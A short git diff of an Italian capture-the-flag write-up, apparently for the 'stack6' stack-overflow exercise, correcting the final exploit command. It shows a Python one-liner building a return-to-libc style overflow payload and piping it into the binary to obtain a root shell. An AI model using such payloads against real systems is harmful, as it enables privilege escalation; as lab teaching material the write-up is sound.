@@ -98,7 +98,7 @@ EXPLOIT FINALE:
 ```console
 python -c "print 'A' * 80 + '\xb0\xff\xec\xb7' + '\xc0\x60\xec\xb7' + '\xbf\x63\xfb\xb7'" > /tmp/exploit
 
-cat /tmp/exploit; cat) | ./stack6
+(cat /tmp/exploit; cat) | ./stack6
 ```
 
 Attraverso l’exploit finale riusciamo ad ottenere la shell con i permessi di ROOT e vincere la sfida.
